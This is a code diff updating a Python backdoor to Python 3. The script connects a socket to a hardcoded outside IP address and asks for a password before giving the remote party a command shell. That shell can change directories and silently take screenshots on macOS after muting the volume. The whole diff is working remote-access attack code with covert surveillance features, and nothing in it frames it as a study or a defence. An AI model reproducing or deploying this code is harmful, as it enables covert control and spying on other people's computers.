@@ -3,35 +3,37 @@ import os
 import socket
 import subprocess
 import time
-import getpass
-host = ""
-port = 44444
+import threading
+
+host = "80.210.76.214"
+port = 21
 password = 'n0tm1ne'
 # todo openscource den bare for sjov
 # todo popopens
 
+
 def passwd():
     thetry = ''
     while password != thetry:
-        s.send('password pleas: ')
-        thetry = str(s.recv(1024)[:-1:])
+        s.send('password pleas: '.encode())
+        thetry = s.recv(1024).decode()[:-1:]
         if thetry == password:
             shell()
         else:
-            s.send('try again \n')
+            s.send('try again \n'.encode())
 
 
 def shell():
     while True:
-        s.send('\033[91m' + os.getcwd() + '>> ' + '\033[0m')  # yep i added fucking colors what are you gonna do?
-        command = s.recv(1024)[:-1:]      # [:1:] cutter \n af
+        s.send('\033[91m'.encode() + os.getcwd().encode() + '>> '.encode() + '\033[0m'.encode())  # yep i added fucking colors what are you gonna do?
+        command = s.recv(1024).decode()[:-1:]      # [:1:] cutter \n af
         if len(command) > 0:
             if command[:8] == 'shutdown':
-                s.send('Just reconnect if you want. But bye for now \n')
+                s.send('Just reconnect if you want. But bye for now \n'.encode())
                 s.close()
                 break
             elif 'stopnow' == command:
-                s.send('Bye \n')
+                s.send('Bye \n'.encode())
                 quit()
                
             elif command[:5] == 'blast':
@@ -45,7 +47,7 @@ def shell():
                 try:
                     os.chdir(command.split(' ')[1])
                 except Exception as e:
-                    s.send(str(e))
+                    s.send(str(e).encode())
 
             elif command[:10] == 'screenshot':
                 piccmds = ['osascript -e "set Volume 0"', 'screencapture -x shot.jpg']
